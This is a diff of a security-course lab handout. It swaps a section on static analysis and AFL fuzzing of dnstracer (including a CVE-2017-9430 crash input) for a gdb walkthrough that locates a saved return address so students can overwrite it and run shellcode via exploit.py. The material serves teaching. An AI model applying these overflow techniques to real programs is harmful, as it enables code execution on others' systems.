+5655a000-5657c000 rwxp 00000000 00:00 0                                  [heap]
+f7dd5000-f7fba000 r-xp 00000000 fc:03 1847105                            /usr/lib32/libc-2.31.so
+f7fba000-f7fbb000 ---p 001e5000 fc:03 1847105                            /usr/lib32/libc-2.31.so
+f7fbb000-f7fbd000 r-xp 001e5000 fc:03 1847105                            /usr/lib32/libc-2.31.so
+f7fbd000-f7fbe000 rwxp 001e7000 fc:03 1847105                            /usr/lib32/libc-2.31.so
+f7fbe000-f7fc1000 rwxp 00000000 00:00 0
+f7fcb000-f7fcd000 rwxp 00000000 00:00 0
+f7fcd000-f7fd0000 r--p 00000000 00:00 0                                  [vvar]
+f7fd0000-f7fd1000 r-xp 00000000 00:00 0                                  [vdso]
+f7fd1000-f7ffb000 r-xp 00000000 fc:03 1847101                            /usr/lib32/ld-2.31.so
+f7ffc000-f7ffd000 r-xp 0002a000 fc:03 1847101                            /usr/lib32/ld-2.31.so
+f7ffd000-f7ffe000 rwxp 0002b000 fc:03 1847101                            /usr/lib32/ld-2.31.so
+fffdd000-ffffe000 rwxp 00000000 00:00 0                                  [stack]
 ```
 
-Although this is useful information, there are so many of these warnings
-it's difficult to see other potentially serious issues. So we'll disable
-those. Run:
+This gives you a picture of the process's virtual memory -- memory
+addresses are in the leftmost column. The actual program instructions
+of `stack-L1-dbg` -- the "text segment" --
+are in the addresses `0x56555000` to `0x5655a000` (the top few lines). Back in `gdb`, if you
+ask for the memory address of the instructions of the `main` routine,
+you should get an address in that range:
 
 ```
-$ CC=clang CFLAGS="-pedantic -std=c11 -Wall -Wextra -Wno-pointer-sign" ./configure
-$ make clean all
+(gdb) print main
+$1 = {int (int, char **)} 0x565562e0 <main>
 ```
 
-The `-pedantic` flag tells the compiler to adhere strictly to the C11
-standard (`-std=c11`); compilation now fails, however: the author of
-`dnstracer` did not write properly compliant C code. In particular:
+The *stack* is in the range of addresses from `0xfffdd000` to
+`0xffffe000`.
 
-- proper `#include`s for `strncasecmp`, `strdup` and `getaddrinfo` are missing
-- proper `#include`s for the `struct addrinfo` type are missing
+If we're stopped somewhere in the `bof` function, then if we issue the
+`backtrace` command, we can get some basic information about the stack
+frames currently on the stack:
 
-Check `man strncasecmp`, and you'll see it requires `#include
-<strings.h>`, which is missing from the C code. `man strdup` tells us
-that this is a Linux/POSIX function, not part of the C standard
-library; to inform the compiler we want to use POSIX functions, we
-should add a line `#define _POSIX_C_SOURCE 200809L` to our C code.
-Furthermore, it'll be useful to make use of *static asserts*, so we
-should include the `assert.h` header. Edit the `dnstracer.c` file, and
-add the following near the top of the file (e.g. just after the first
-block comment):
-
-```C
-#define _POSIX_C_SOURCE 200809L
-#define _DEFAULT_SOURCE
-#include <assert.h>
+```
+(gdb) backtrace
+#0  bof (str=0xffffd2e3 "\n\212\027\377\367\bRUV\001") at stack.c:17
+#1  0x565563ee in dummy_function (str=0xffffd2e3 "\n\212\027\377\367\bRUV\001") at stack.c:46
+#2  0x56556382 in main (argc=1, argv=0xffffd5a4) at stack.c:34
 ```
 
-The `#define`s need to appear *before* we start `include`-ing header
-files. If we now run `make clean all`, we should have got rid of many
-compiler-generated warnings. But many more problems exist.
+This says there are 3 stack frames on the stack. Stack frame #2
+represents our position in the `main` function. We've just executed an
+instruction sitting at location `0x56556382` in memory,[^main_line] which
+corresponds to `stack.c` line 34 (i.e., the call to
+`dummy_function(str)`).
 
-<div style="border: solid 2pt blue; background-color: hsla(241, 100%,50%, 0.1); padding: 1em; border-radius: 5pt; margin-top: 1em; margin-bottom: 1em">
+[^main_line]: A little math tells us that (*location_in_main* $-$
+  *start_of_main*) = $(0x56556382 - 0x565562e0)$ = 162; we're
+  162 instructions past the start of the `main` function. If we
+  wanted, we could view the precise assembly language instructions
+  being executed, by issuing the gdb command `layout asm`.
 
-**Writing portable C code**
+Similarly, stack frame #1 represents our position in `dummy_function`,
+and stack frame #0 is the current stack frame.
 
-If we want to write portable C code -- code that will work with other C
-compilers and/or other operating systems -- it's important to specify what *C
-standard* we're wanting to adhere to (in this case, C11), and to request
-that the compiler strictly adhere to that standard.
+We can get more information about a stack frame using the `info frame`
+command. For instance, issuing the gdb command `info frame 0` should
+result in output like the following:
 
-When we invoke `gcc` or `clang` with the arguments "`-std=c11
--pedantic`",
-this disables many compiler-specific extensions. For example: the C
-standard says it's impermissible to declare a zero-length array
-(e.g. `int myarray[0]`), but by default, `gcc` will let you do so
-without warning.
-In general, disabling compiler-specific extensions is a good thing: it
-ensures we don't accidentally use `gcc`-only features, and makes our
-code more portable to other compilers.
- 
-One reason some people don't add those arguments is because (as we saw
-above) doing so may make their programs stop compiling. But this is because
-they haven't
-been sufficiently careful about distinguishing between functions that
-are part of the [C standard
-library](https://en.wikipedia.org/wiki/C_standard_library), and
-functions which are specific to the operating system they happen to be
-compiling on.
-
-For example, `fopen` is part of the C standard library; if you run
-`man fopen`, you'll see it's include in the `stdio.h` header file.
-(And if you look under the "Conforming to" heading in the man page, you'll
-see it says `POSIX.1-2001, POSIX.1-2008, C89, C99` -- `fopen` is part of
-the C99 (and later) versions of the C standard.)
-
-On the other hand, `strncasecmp` is *not* part of the C standard
-library: it was introduced by BSD (the "Berkeley Standard
-Distribution"), a previously popular flavour of Unix. It was later
-adopted by many other operating systems (Linux among them), and is part
-of the [POSIX standard][posix] for Unix-like operating systems.
-(If you look under the "Conforming to" heading in the man page, you'll
-see it says `4.4BSD, POSIX.1-2001, POSIX.1-2008`.)
-
-[posix]: https://en.wikipedia.org/wiki/POSIX
-
-Using `-std=c11 -pedantic` encourages you to be more explicit about what
-OS-specific functions you're using. `strncasecmp` is usually only found
-on Unix-like operating systems. It isn't available, for instance, when
-compiling on
-Windows with the MSVC compiler; if you want similar functionality, you need the
-[`_strnicmp` function][strnicmp].
-
-[strnicmp]: https://docs.microsoft.com/en-us/cpp/c-runtime-library/reference/strnicmp-wcsnicmp-mbsnicmp-strnicmp-l-wcsnicmp-l-mbsnicmp-l?view=msvc-170
-
-Sometimes when using a function from a standard other than the C
-standards,
-your compiler will require you to specify exactly what
-version of the standard you want to comply with. For instance,
-`man strdup` (rather obliquely) tells you that adding
-
-```C
-#define _POSIX_C_SOURCE 200809L
+```
+(gdb) info frame 0
+Stack frame at 0xffffcec0:
+ eip = 0x565562c2 in bof (stack.c:17); saved eip = 0x565563ee
+ called by frame at 0xffffd2d0
+ source language c.
+ Arglist at 0xffffce3c, args: str=0xffffd2e3 "\n\212\027\377\367\bRUV\001"
+ Locals at 0xffffce3c, Previous frame's sp is 0xffffcec0
+ Saved registers:
+  ebx at 0xffffceb4, ebp at 0xffffceb8, eip at 0xffffcebc
 ```
 
-to your C code is one way of making the `strdup` function available.
+This tells us:
 
-Using `-std=c11 -pedantic` doesn't *guarantee* your code conforms with
-the C standard (though it does help). Even with those flags enabled,
-it's still quite possible to write
-non-conforming programs. As the [`gcc` manual says][pedantic]:
+- Looking at the first line of output, `Stack frame at 0xffffcec0`:
 
-> Some users try to use `-Wpedantic` to check programs for strict ISO C
-> conformance. They soon find that it does not do quite what they want:
-> it finds some non-ISO practices, but not all -- only those for which
-> ISO C requires a diagnostic, and some others for which diagnostics
-> have been added.
+  The current stack frame, for `bof`, is at location `0xffffcec0`. (The stack frames
+  for `dummy_function` and `main`, if we inspect them, will be at higher addresses in memory.
+  Recall that the stack grows from *high* memory addresses to *low*
+  ones.)
+- Looking at the second line of output, `eip = 0x565562c2 in bof
+  (stack.c:17); saved eip = 0x565563ee`:
 
-From a security point of view, it's easier to audit code that's explicit
-about what libraries it's using, than code which leaves that implicit;
-so specifying a C standard and `-pedantic` is usually desirable.
+  This tells us about the value of the `eip` register. On Intel
+  processors, this is the "Extended Instruction Pointer" register -- it
+  keeps track of what instruction is currently being executed.
 
-[pedantic]: https://gcc.gnu.org/onlinedocs/gcc/Warning-Options.html#Warning-Options
+  `eip = 0x565562c2 in bof (stack.c:17)` tells us that we're currently
+  executing the instruction at location `0x565562c2` in memory, and that it
+  corresponds to `stack.c` line 17.
+
+  `saved eip = 0x565563ee` tells us about the
+  bit of the stack frame that says what code to execute after the
+  current function returns. Presently, the stack frame is going to
+  return to location `0x565563ee` -- the spot in `dummy_function`
+  where we've just executed the call to `bof()`.
+
+- Looking at the last line of output, `eip at 0xffffcebc`:
+
+  This tells us the location we need to overwrite, if we want to jump
+  to somewhere *other* than `dummy_function`.
+
+  Memory location `0xffffcebc` is the part of the current stack frame
+  which stores the "next instruction to execute" after `bof` returns.
+
+Let's examine the Instruction Pointer a little. Make sure you're
+stopped in the middle of the `bof` function: issue the gdb commands
+`run` (this will ask you if you want to restart the program; answer yes)
+and `next` to get there.
+
+Issue the gdb comman `print $eip` to show the current value of the
+Instruction Pointer, and you should see something like the following:
+
+```
+(gdb) print $eip
+$8 = (void (*)()) 0x565562c2 <bof+21>
+```
+
+What does this mean?
+
+- `(void (*)())` says that we should think of the `eip` register
+  as holding a pointer to a function taking no arguments and returning
+  void.
+- `0x565562c2` is the location in memory of the address currently
+  being executed.
+- `<bof+21>` says it's 21 instructions past the start of `bof`.
+  (If you like, you can confirm this by issuing the gdb command `print
+  bof` -- that will tell you where the *first* instruction in `bof`
+  is located -- and checking that it's equal to *address_in_eip* $-$ 21.
+
+Now let's do the same for the *saved* `eip`.
+
+<div style="border: solid 2pt blue; background-color: hsla(241, 100%,50%, 0.1); padding: 1em; border-radius: 5pt; margin-top: 1em;">
+
+**Convenience variables in gdb**
+
+Sometimes while debugging in `gdb`, it's handy to be able to hang onto
+some value because it will be useful to refer to it in a later step.
+
+`gdb` lets us define *convenience variables* (see the `gdb`
+documentation on them [here][gdb-conv-var]). These variables aren't part
+of the program being debugged; they exist purely within `gdb`,
+and have no effect on the execution of the program. They're more like a
+piece of GDB-specific "scratch paper" on which you might write down notes
+for later.
+
+[gdb-conv-var]: https://sourceware.org/gdb/onlinedocs/gdb/Convenience-Vars.html
+
+Convenience variables start with a dollar sign ("`$`"). You can *set* a
+convenience variable with a command like:
+
+```
+(gdb) set $myvar = 0x2020
+```
+
+and thereafter use the variable in any `gdb` command. For instance, the
+following will print the value of `$myvar`:
+
+```
+(gdb) print/x $myvar
+$9 = 0x2020
+```
+
+(The "`/x`" after the "print" command instructs `gdb` to print the
+result in hexadecimal notation, rather than decimal, and is useful for
+printing the value of pointers.)
+
 
 </div>
 
-
-### 2.2. Static analysis
-
-We'll identify some problems with `dnstracer`
-using `flawfinder` -- read "How does Flawfinder
-Work?", here: <https://dwheeler.com/flawfinder/#how_work>.
-Flawfinder is a linter or static analysis tool that checks for known
-problematic code (e.g. code that calls unsafe functions like `strcpy`
-and `strcat`). Run:
+We know the saved `eip` is stored
+in memory location `0xffffcebc`. Let's see where that *currently*
+points. We'll use `gdb`'s "convenience variables" to make our commands a
+bit easier to read.
 
 ```
-$ flawfinder *.c
-# ... many lines omitted ...
-Not every hit is necessarily a security vulnerability.
-You can inhibit a report by adding a comment in this form:
-// flawfinder: ignore
-Make *sure* it's a false positive!
-You can use the option --neverignore to show these.
+(gdb) set $saved_eip = 0xffffcebc
+#     ^ store the location for later
+(gdb) print (size_t *) $saved_eip
+#     ^ we can tell gdb to treat $saved_eip as a pointer to size_t*
+$10 = (size_t *) 0xffffcebc
+(gdb) print/x (* ((size_t *) $saved_eip))
+#     ^ now we *dereference* the $saved_eip location,
+#       displaying (in hex) the address it holds.
+$11 = 0x565563ee
 ```
 
-You'll see a *lot* of output. Good static analysis tools allow us to
-ignore particular bits of code that would be marked problematic, either
-temporarily, or because we can prove to our satisfaction that the code is safe.
+We know it's okay to treat `$saved_eip` as a "pointer to `size_t`",
+because a `size_t` is big enough to hold any address in memory.[^intptr]
+`gdb` tells us that the current contents of `$saved_eip` is `0x565563ee` --
+and that is indeed the address `gdb` has said we're going to jump back
+to.
 
-The output of flawfinder is not especially convenient for browsing;
-we'll use `vim` to navigate the problems, instead. Run `vim
-dnstracer.c`, then type
+We can issue the command  `print (void (*)()) 0x565563ee` to confirm
+where that adddress is -- `gdb` will tell us that it's the same as
+`<dummy_function+62>`. (We cast it to the type "pointer to a function
+taking no arguments and returning `void`", so that `gdb` knows to
+interpret it as the address of executable code.)
 
-```
-:Tagbar
-```
+[^intptr]: Technically, it would be more appropriate to treat `$saved_eip`
+  as a "pointer to `intptr_t`" or as a "pointer to a function pointer" --
+  but "`size_t`" is much easier to read.
 
-and
+So, we've confirmed that the saved `eip` register does says that
+once the current function has finished executing, we're to jump
+back into somewhere in `dummy_function` (specifically, the 62nd
+instruction after the start of the function).
 
-```
-:lopen
-```
+So, how can we overwrite the saved `eip`? We'll need to know
 
-in `vim`. "Tagbar" makes it easier to navigate our code, by showing the
-functions and types of our program in a new VIM pane. `:lopen` opens
-the "Location" pane, which reports the locations of problematic code (as
-reported by linters on our system). Use `ctrl-W` and then an arrow key
-to navigate between window panes. In the Tagbar pane, the `enter` key
-will expand or collapse sections (try it on `macros`), and if we go to
-the name of a function or field (e.g. the field `next` in an `answer`
-struct), hitting `enter` will go to the place in our C code where it's
-defined. Switch to the "Location" pane; navigating onto a line and
-hitting `enter` will take us to the problematic bit of code.
-Navigating to the "Location" pane and entering `:resize 20` resizes the
-height of the pane to 20 lines.
+(a) where the `buffer[BUF_SIZE]` local variable is sitting in
+    memory. This is where the contents of `badfile` will get written.
+(b) how far past that location the saved `eip` is. If we adjust the
+    contents of `badfile` carefully, we should be able to
+    overwrite the saved `eip` with the address of some other function.
 
-We can now much more easily match up problematic bits of code with the
-warnings from `flawfinder`. We'll take a look at one of those now.
-
-In the Tagbar pane, search for "`rr_types`". (A forward slash, "`/`",
-in Vim will do a search for us.) Navigate to it with `enter`, and
-observe a yellow highlight on the line, telling us there's a warning for
-it. Switch to the location list, and search for that line (188 in my
-editor). Flawfinder is giving us a general warning about *any* array
-with static bounds (which is, really, all arrays in C11). However,
-there's another issue here -- what is it?
-
-The declared size of the array, and the number of the elements should
-match up; if someone changes one but not the other, that could introduce
-problems. We'll add a more reliable way of checking this.
-
-- *Remove* the size `256` from the array declaration.
-- Below it, add
-
-  ```
-  static_assert(sizeof(rr_types) / sizeof(rr_types[0]) == 256,
-                   "rr_types should have 256 elements");
-  ```
-
-We're now statically checking that the number of elements in `rr_types`
-(i.e., the size of the array in bytes, divided by the size of one
-element) is always 256.
-
-In the locations pane, you'll also see warnings from a program called
-`clang-tidy`. It can also be run from the command-line (see `man
-clang-tidy` for details); try running
+We can get item (a) by issuing the command `print &buffer`. The output
+should be something like:
 
 ```
-$ clang-tidy --checks='-clang-diagnostic-pointer-sign' --extra-arg="-DHAVE_CONFIG_H -I. -Wno-pointer-sign" dnstracer.c --
+(gdb) print &buffer
+$12 = (char (*)[100]) 0xffffce4c
 ```
 
-We need to give `clang-tidy` correct compilation arguments (like `-I.`),
-or it won't know where the `config.h` header is and will mis-report
-errors. We want it not to report problems with pointers being coerced
-from signed to unsigned or vice versa (i.e., the same issue flagged
-by `gcc` with `-Wno-pointer-sign`), so we disable that check by putting
-a minus in front of `clang-diagnostic-pointer-sign`.
-(For some reason, though, the "pointer sign" warnings still get reported
-in Vim by ALE -- if anyone works out how they can be disabled, feel free
-to let me know.)
+So the address of the saved `eip`, minus the address of `buffer`, tells
+us the spot in `badfile` that should contain the address of our
+malicious shellcode.
 
-<div style="border: solid 2pt blue; background-color: hsla(241, 100%,50%, 0.1); padding: 1em; border-radius: 5pt; margin-top: 1em; margin-bottom: 1em">
+To start with, you might want to focus on overwriting the saved `eip`
+with a function of your choosing and get that working, before trying to
+force execution of your shellcode.
 
-**Integrating linter warnings with editors and IDEs**
+For instance, can you overwrite the saved `eip` so that when the `bof`
+function finishes, execution will -- instead of jumping to instruction
+`<bof+21>` -- jump to the start of `bof` again, or the start of
+`dummy_function`? In `exploit.py`, change the value of `ret` to the location
+of the function you want to jump to, and change `offset` to the
+distance between `buffer` and the saved `eip`. You can then use `gdb` to
+step through execution of `stack-L1-dbg` and confirm whether this
+worked.
 
-As you can see, the output of linters and other static analysers is much
-more usable when it can be integrated with our editor or IDE, but it's
-often not obvious how to make sure our editor/IDE is calling the
-C compiler and linters with the command-line arguments we want.
+Then, try to get your shellcode executed. In `exploit.py`,
+change the value of `shellcode` so that it holds the shellcode
+instructions to execute. You'll then need to decide where
+in `buffer` your shellcode should be inserted (leaving it at 0 to start
+with is fine); work out what the start address of your shellcode is
+going to be;
+and ensure that `ret` contains that address.
 
-In GUI tools like [Eclipse IDE][eclipse] and [VS Code][vs-code], these
-configurations are often "hidden" in deeply-nested menu options.
-In `vim`, the configurations are instead included as commands in your
-`~/.vimrc` file (`vimrc` stands for "`vim` run commands" -- commands
-which are to be run when `vim` starts up). What commands are needed
-for `vim` plugins like ALE to work properly may still not be
-straightforward to work out -- we ended up needing
 
-```
-let g:ale_c_gcc_options = '-std=c11 -Wall -Wextra -DHAVE_CONFIG_H -I. -Wno-pointer-sign'
-let g:ale_c_clang_options = '-std=c11 -Wall -Wextra -DHAVE_CONFIG_H -I. -Wno-pointer-sign'
-let g:ale_c_clangtidy_checks =  ['-clang-diagnostic-pointer-sign', 'cert-*']
-let g:ale_c_clangtidy_options =  '--extra-arg="-DHAVE_CONFIG_H -I. -Wno-pointer-sign"'
-```
 
--- but once you *have* worked out what they are, at least they're
-always in a consistent place.
+## Credits
 
-[eclipse]: https://www.eclipse.org/ide/
-[vs-code]: https://code.visualstudio.com 
+The code for the programs in this lab is adapted from the
+Set-UID lab at
+<https://web.ecs.syr.edu/~wedu/seed/Labs/Set-UID/Set-UID.pdf>
+and is copyright Wenliang Du, Syracuse University.
 
-</div>
+<!--
 
+also
 
-## 2.3. Dynamic analysis
+https://seedsecuritylabs.org/Labs_20.04/Files/Buffer_Overflow_Setuid/Buffer_Overflow_Setuid.pdf
 
-Let's see how `dnstracer` is supposed to be used. It will tell us the
-chain of [DNS name servers](https://en.wikipedia.org/wiki/Name_server)
-that needs to be followed to find the IP address
-of a host. For instance, try
+-->
 
-```
-$ ./dnstracer -4 -s ns.uwa.edu.au www.google.com
-$ ./dnstracer -4 -s ns.uwa.edu.au www.arranstewart.io
-```
+<br><br>
 
-These commands say to use a local UWA nameserver (ns.uwa.edu.au)
-and to follow the chain of nameservers needed to get IP addresses for
-two hosts (www.google.com and www.arranstewart.io). The "Google" host is
-fairly dull; it seems the UWA nameserver stores that IP address directly
-itself. The second is a little more interesting, as it requires name
-servers run by [Hurricane Electric](http://he.net)
-to be queried.
-
-Now re-compile with `gcc` at the `O2` optimization level, and try some
-specially selected input:
-
-```
-$ CC=gcc CFLAGS="-pedantic -g -std=c11 -Wall -Wextra -Wno-pointer-sign -O2" ./configure
-$ make clean all
-$ ./dnstracer -v $(python3 -c 'print("A"*1025)')
-```
-
-You should see the message
-
-```
-*** buffer overflow detected ***: terminated
-Aborted (core dumped)
-```
-
-This is the "denial of service" problem reported in
-[CVE-2017-9430](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-9430).
-A buffer overflow occurs, but gets caught by gcc's inbuilt protections
-and causes the problem to crash. This is better than a buffer overflow
-being allowed to execute unchecked,
-but is still a problem: in general, a user should *not* be able to make a program segfault or
-throw an exception based on data they provide. Doing so for e.g. a
-server program -- e.g. if a server ran code like `dnstracer`'s and
-allowed users to provide input via, say, a web form --
-could result in one user being able to force the program to crash, and
-create a denial of service for other users. (In the present case,
-`dnstracer` *isn't* a server, though, so the risk is actually very
-minimal.)
-
-Note that the problem doesn't show up when compiling with `clang`, and
-only appears at the `O2` optimization level (which is often applied when
-software is being built for distribution to users). Recall that at
-higher optimization levels, the compiler tends to make stronger and
-stronger assumptions that no Undefined Behaviour ever occurs, and this
-can lead to vulnerabilities.
-
-One can analyse the dumped `core` file in `gdb` to find the problematic
-code.
-
-We need to run the following to ensure core dumps work properly
-on Ubuntu:
-
-```
-$ ulimit -c unlimited
-$ sudo systemctl stop apport.service
-$ sudo systemctl disable apport.service
-```
-
-(If we don't run these, Ubuntu instead tries to send information about
-the crash to Canonical's servers.)
-
-Run the bad input again, then `gdb`:
-
-```
-$ ./dnstracer -v $(python3 -c 'print("A"*1025)')
-$ gdb -tui ./dnstracer ./core
-```
-
-In GDB, run the commands `backtrace`, then `frame 7`: you should
-see that a call to `strcpy` on about line 1628 is the cause.
-
-We'll try to find this flaw using a particular *dynamic* analysis
-technique called
-"fuzzing". Static analysis analyses the static artifacts of a system
-(like the code source files); dynamic analysis actually runs the
-program.
-We'll use a program called `afl-fuzz`[^afl] to find that
-bug for us, and identify input that will trigger it.
-
-[^afl]: "AFL" stands for "American Fuzzy
-  Lop", a type of rabbit; `afl-fuzz` was developed by Google. Read about
-  it further at <https://github.com/google/AFL>. (If you have time, you
-  might like to try using another fuzzer, `honggfuzz`,
-  by reading the documentation at <https://github.com/google/honggfuzz>.)
-
-Fuzzers are very effective at finding code that can trigger program
-crashes, and `afl-fuzz` would normally be able to find this
-vulnerability (and probably many others) by itself if we just let it run
-for a couple of days. To speed things up, however -- because in this
-case we already *know* what the vulnerability is -- we'll give the
-fuzzer some hints.
-
-`afl-fuzz` requires our program take its input from standard in, so
-we need to add the following code at the start of `main`
-(search in vim for `argv` to find it, or use the Tagbar pane and search
-for `main`):
-
-```C
-
-    int  new_argc = 2;
-    char **new_argv;
-    {
-    new_argv = malloc(sizeof(char*) * new_argc + 1);
-
-    // copy argv[0]
-    size_t argv0_len = strlen(argv[0]);
-    new_argv[0] = malloc(argv0_len + 1);
-    strncpy(new_argv[0], argv[0], argv0_len);
-    new_argv[argv0_len] = '\0';
-
-    // read in argv[1] from file
-    const size_t BUF_SIZE = 4096;
-    char buf[BUF_SIZE];
-    ssize_t res = read(0, buf, BUF_SIZE - 1);
-    if (res > BUF_SIZE)
-      res = BUF_SIZE;
-    buf[res] = '\0';
-
-    new_argv[1] = malloc(sizeof(char) * (res + 1));
-    strncpy(new_argv[1], buf, res);
-    new_argv[1][res] = '\0';
-
-    // set argv[2] to NULL terminator
-    new_argv[new_argc] = NULL;
-    }
-
-    argv = new_argv;
-    argc = new_argc;
-```
-
-This code reads a line from standard input, makes a "bogus"
-version of `argv` called `new_argv` which contains that input at
-`argv[1]`, then replaces `argc` and `argv` with our new version.
-
-AFL requires some sample, valid inputs to work with. Run the following:
-
-```
-$ mkdir -p testcase_dir
-$ printf 'www.google.com' > testcase_dir/google
-$ python3 -c 'print("A"*980, end="")' > testcase_dir/manyAs
-```
-
-We also need to ideally allow afl-fuzz to *instrument* the code
-(i.e., insert extra instructions so it can analyze what the running code
-is doing) -- though afl-fuzz will still work even without this step. Recompile with:
-
-```
-$ CC=/usr/bin/afl-gcc CFLAGS="-pedantic -g -std=c11 -Wall -Wextra -Wno-pointer-sign -O2" ./configure
-$ make clean all
-```
-
-Then run
-
-```
-$ afl-fuzz -d -i testcase_dir -o findings_dir -- ./dnstracer
-```
-
-A "progress" screen should shortly appear, showing what AFL-fuzz is
-doing -- something like this:
-
-
-<pre style="line-height: 1.0"><code>
-             american fuzzy lop ++2.59d (dnstracer) [explore] {-1}
-┌─ process timing ────────────────────────────────────┬─ overall results ────┐
-│        run time : 0 days, 0 hrs, 0 min, 18 sec      │  cycles done : 2     │
-│   last new path : 0 days, 0 hrs, 0 min, 0 sec       │  total paths : 70    │
-│ last uniq crash : none seen yet                     │ uniq crashes : 0     │
-│  last uniq hang : none seen yet                     │   uniq hangs : 0     │
-├─ cycle progress ───────────────────┬─ map coverage ─┴──────────────────────┤
-│  now processing : 66*0 (94.3%)     │    map density : 0.02% / 0.23%        │
-│ paths timed out : 0 (0.00%)        │ count coverage : 1.71 bits/tuple      │
-├─ stage progress ───────────────────┼─ findings in depth ───────────────────┤
-│  now trying : splice 4             │ favored paths : 26 (37.14%)           │
-│ stage execs : 60/64 (93.75%)       │  new edges on : 30 (42.86%)           │
-│ total execs : 58.0k                │ total crashes : 0 (0 unique)          │
-│  exec speed : 3029/sec             │  total tmouts : 0 (0 unique)          │
-├─ fuzzing strategy yields ──────────┴───────────────┬─ path geometry ───────┤
-│   bit flips : n/a, n/a, n/a                        │    levels : 8         │
-│  byte flips : n/a, n/a, n/a                        │   pending : 29        │
-│ arithmetics : n/a, n/a, n/a                        │  pend fav : 0         │
-│  known ints : n/a, n/a, n/a                        │ own finds : 68        │
-│  dictionary : n/a, n/a, n/a                        │  imported : n/a       │
-│   havoc/rad : 29/29.2k, 39/28.0k, 0/0              │ stability : 100.00%   │
-│   py/custom : 0/0, 0/0                             ├───────────────────────┘
-│        trim : 50.13%/169, n/a                      │             [cpu:322%]
-└────────────────────────────────────────────────────┘
-</code></pre>
-
-The AFL-fuzz documentation gives an explanation of this screen
-[here][afl-fuzz-status-screen].
-
-[afl-fuzz-status-screen]: https://github.com/google/AFL/blob/master/docs/status_screen.txt
-
-
-We've given afl-fuzz a *very* strong hint here about some valid input
-that's *almost* invalid (`testcase_dir/manyAs`); but given time and
-proper configuration, many fuzzers will be able to identify such input
-for themselves.
-
-After about a minute, afl-fuzz should report that it has found a
-"crash"; hit ctrl-c to stop it, and look in `findings_dir/crashes`
-for the identified bad input.
-
-<div style="border: solid 2pt blue; background-color: hsla(241, 100%,50%, 0.1); padding: 1em; border-radius: 5pt; margin-top: 1em; margin-bottom: 1em">
-
-**Crash files**
-
-Inside the `findings_dir/crashes` directory should be files containing
-input that will cause the program under test to crash.
-For instance, on one run of AFL-fuzz, a "bad input" file is produced
-called
-"`findings_dir/crashes/id:000000,sig:06,src:000083,time:25801+000001,op:splice,rep:16`".
-The filename gives information about the crash that occurred and how the
-input was derived.
-
-- "`id:000000`" is an ID for this crash – this is the" first and only
-  crash found, so the ID is 0.
-- "`sig:06`" says what [*signal*][signal] caused the program to crash.
-  You can get a list of Linux signals and their numbers by running the
-  command "`kill -L`": signal 6 is "`SIGABRT`", which is raised when a
-  program calls the [`abort()`][abort] function. `abort()` typically
-  gets called by the process itself; in this case, the code added by gcc
-  to detect buffer overflows detects an overflow has occured, and "bails
-  out" by calling `abort()`.
-- "`src:000083`" isn't too important to understand, but matches up the
-  crash with an item in AFL-fuzz's "queue" of inputs to try (also
-  available under the `findings_dir`).
-- "`time:25801+000001`" gives information about when the crash occurred.
-- "`op:splice,rep:16`" gives information about what AFL-fuzz did to one
-  of our inputs to get the new input that caused the crash. In this
-  case, it performed a "splice" operation (inserting new characters into
-  the input string) 16 times.
-
-[signal]:https://en.wikipedia.org/wiki/Signal_(IPC)
-[abort]: https://man7.org/linux/man-pages/man3/abort.3.html
-
-Since gcc's buffer overflow protections are enabled, we should expect a
-crash to occur exactly when the input is long enough to overflow the
-buffer -- at that point, gcc's protection code detects that something has
-been written outside the buffer bounds, and calls `abort()`. So all
-AFL-fuzz has to do to trigger a crash is lengthen the input string
-enough. But AFL-fuzz *monitors* the code paths the program under test is
-executing -- that's what the "instrumentation" step is for -- and can
-thus "learn" to explore quite complicated input structures -- see [this
-post][afl-fuzz-jpeg] by the main developer of AFL-fuzz, Michał Zalewski,
-in which AFL-fuzz "learns" how to generate valid JPEG files, just from
-being given the input string "`hello`".
-
-[afl-fuzz-jpeg]: https://lcamtuf.blogspot.com/2014/11/pulling-jpegs-out-of-thin-air.html
-
-</div>
-
-
-In general, running a fuzzer on potentially vulnerable software is a
-pretty "cheap" activity: one can leave a fuzzer running for several
-days with simple, valid input, and check at the end of that period to see what
-problems have been discovered.
-
-# 3. Further reading
-
-Take a look at *The Fuzzing Book* (by Andreas Zeller, Rahul Gopinath,
-Marcel Böhme, Gordon Fraser, and Christian Holler) at
-<https://www.fuzzingbook.org>, in particular the "Introduction to
-Fuzzing" at <https://www.fuzzingbook.org/html/Fuzzer.html>.
-
-Fuzzing doesn't apply just to C programs; the idea behind fuzzing
-is to randomly generate inputs in hopes of revealing crashes or other
-bad behaviour by a program. The *Fuzzing Book* demonstrates how
-the techniques by applying them to Python programs, but they are
-generally applicable to any language.
-
-Fuzzing has been very successful
-at finding security vulnerabilities in software -- often much more so
-than writing unit tests, for instance. An issue with unit tests is that
-human testers can't generate as *many* tests as a fuzzer can (fuzzers
-will often generate at least thousands per second), and often have
-trouble coming up with test inputs that are sufficiently "off the beaten
-path" of normal program execution to trigger vulnerabilities.
-
-Fuzzers often work well with some of the dynamic *sanitizers* which
-we've seen `gcc` and `clang` provide. The sanitizers
-(such as ASAN, the
-[AddressSanitizer](https://github.com/google/sanitizers/wiki/AddressSanitizer),
-and  UBSan, the [Undefined Behaviour
-sanitizer](https://clang.llvm.org/docs/UndefinedBehaviorSanitizer.html))
-help with making a program *crash* if memory-access problems or
-undefined behaviour are detected.
-
-You can read more about AFL-fuzz at
-<https://afl-1.readthedocs.io/en/latest/fuzzing.html>, and if you have
-time, experiment with the `honggfuzz` fuzzer
-(<https://github.com/google/honggfuzz>) or using AFL-fuzz in combination
-with sanitizers.
 
 
 
